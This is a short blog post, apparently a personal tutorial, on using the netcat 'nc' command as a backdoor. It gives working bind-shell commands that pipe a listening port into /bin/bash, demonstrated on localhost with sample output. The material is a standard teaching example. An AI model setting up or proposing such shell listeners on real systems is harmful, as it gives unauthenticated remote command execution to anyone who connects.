---
layout: post
title:  "Use 'nc' cli command as backdoor"
author: dave
date:   2023-12-20 15:30:59 +0200
categories: [Reversing, *nix Security]
tags: [Reversing, *nix Security, Networking]
published: true 
---

## Synopsis
Netcat (or nc) is a command-line utility that reads and writes data across network connections, using the TCP or UDP protocols. It is one of the most powerful tools in the network and system administrators arsenal, and it as considered as a Swiss army knife of networking tools.

Netcat is cross-platform, and it is available for Linux, macOS, Windows, and BSD. You can use Netcat to debug and monitor network connections, scan for open ports, transfer data, as a proxy, and more.


### Use 'nc' as backdoor for remote cmd execution
#### The easy way
Earlier the **nc** command supported the **'-e'** flag which allowed the client to execute commands on the server and receive the output. This command flag may not be available anymore today on modern systems (specially macOS). But for completeness here is an example of how to use it.

**Server**

```bash
nc -l 9999 -e /bin/bash
```

**Client**

```bash
nc 127.0.0.1 9999 ls
```
Output on client will be something like:

```bash
Applications
Desktop
Documents
Downloads
Movies
Music
Pictures
...
```

#### The 'old fashioned' way
##### Console on client for output
```bash
nc -l 6968
```

##### Console on server
```bash
nc -l 6969 | /bin/bash | nc 127.0.0.1 6968
```

##### Console on client for sending commands
```bash
nc 127.0.0.1 6969
```

## Credits
- [_linuxhandbook.com_](https://linuxhandbook.com/nc-command/){:target="_blank" rel="noopener"}
- [_linuxize.com_](https://linuxize.com/post/netcat-nc-command-with-examples/){:target="_blank" rel="noopener"}
- [_unix.stackexchange.com_](https://unix.stackexchange.com/questions/352490/is-nc-netcat-on-macos-missing-the-e-flag){:target="_blank" rel="noopener"}